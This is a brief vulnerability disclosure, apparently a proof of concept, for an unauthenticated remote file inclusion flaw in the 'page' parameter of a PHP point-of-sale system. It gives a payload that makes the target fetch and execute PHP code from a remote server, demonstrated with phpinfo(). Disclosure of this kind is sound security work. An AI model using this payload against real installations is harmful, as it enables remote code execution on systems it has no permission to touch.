# Best pos management system in php V1.0 - Remote files containing vulnerabilities can lead to arbitrary code execution

### You do not need to log in and open the website storage directory

Supplier:https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

http://localhost/index.php?page=   ----->    'page' can control some page parameters

Vulnerability location: index.php in the root directory of the website.

![1](/img/Best-pos-management-system-in-php/1.png)

Create 1.php on the remote server with the following content and enable the HTTP service

```php
<?php
phpinfo();
```

![2](/img/Best-pos-management-system-in-php/2.png)

Send a GET request to the target server with the following attack payload

Payload:index.php?page=http://Remote_address/1

![3](/img/Best-pos-management-system-in-php/3.png)
![4](/img/Best-pos-management-system-in-php/4.png)

Successfully executed phpinfo function!